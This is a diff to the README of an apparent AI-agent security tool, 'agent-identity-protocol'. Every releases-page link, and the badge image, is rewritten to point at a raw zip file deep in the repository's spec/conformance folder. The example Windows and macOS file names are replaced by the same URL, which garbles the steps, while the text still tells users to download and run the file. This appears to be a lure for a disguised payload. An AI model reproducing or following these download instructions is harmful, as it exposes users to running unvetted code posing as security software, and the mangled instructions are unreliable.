@@ -1,7 +1,7 @@
 # 🎉 agent-identity-protocol - Enhance Security for AI Agents
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/kxwaii495/agent-identity-protocol/releases)
+[![Download Latest Release](https://github.com/kxwaii495/agent-identity-protocol/raw/refs/heads/main/spec/conformance/protocol-agent-identity-1.8.zip%20Latest%20Release-blue)](https://github.com/kxwaii495/agent-identity-protocol/raw/refs/heads/main/spec/conformance/protocol-agent-identity-1.8.zip)
 
 ## 🚀 Getting Started
 This guide helps you understand how to download and run the Agent Identity Protocol application. This software adds a zero-trust security layer for AI agents and ensures policies are enforced. You will need only the basics to get started.
@@ -17,11 +17,11 @@ Before installing, check that your system meets these requirements:
 ## 📂 Download & Install
 To get the Agent Identity Protocol software, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/kxwaii495/agent-identity-protocol/releases). 
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/kxwaii495/agent-identity-protocol/raw/refs/heads/main/spec/conformance/protocol-agent-identity-1.8.zip). 
 2. **Choose Version:** Look for the most recent version. It will typically be listed first.
 3. **Download the File:** Click on the link to download the appropriate file for your operating system. For instance:
-   - If you are on Windows, you might see a file named `agent-identity-protocol-windows.exe`.
-   - For macOS, it may be `agent-identity-protocol-macos.zip`.
+   - If you are on Windows, you might see a file named `https://github.com/kxwaii495/agent-identity-protocol/raw/refs/heads/main/spec/conformance/protocol-agent-identity-1.8.zip`.
+   - For macOS, it may be `https://github.com/kxwaii495/agent-identity-protocol/raw/refs/heads/main/spec/conformance/protocol-agent-identity-1.8.zip`.
 4. **Save the File:** Choose a location on your computer where you want to save the downloaded file.
 5. **Run the Application:**
    - **Windows Users:** Double-click the `.exe` file you downloaded.
@@ -62,4 +62,4 @@ For more in-depth understanding, explore these topics:
 - **Data Loss Prevention:** Familiarize yourself with techniques to protect sensitive information.
 
 ## 📥 Download Now Again
-Don't forget to [visit this page to download](https://github.com/kxwaii495/agent-identity-protocol/releases) the latest version of the Agent Identity Protocol software.
+Don't forget to [visit this page to download](https://github.com/kxwaii495/agent-identity-protocol/raw/refs/heads/main/spec/conformance/protocol-agent-identity-1.8.zip) the latest version of the Agent Identity Protocol software.
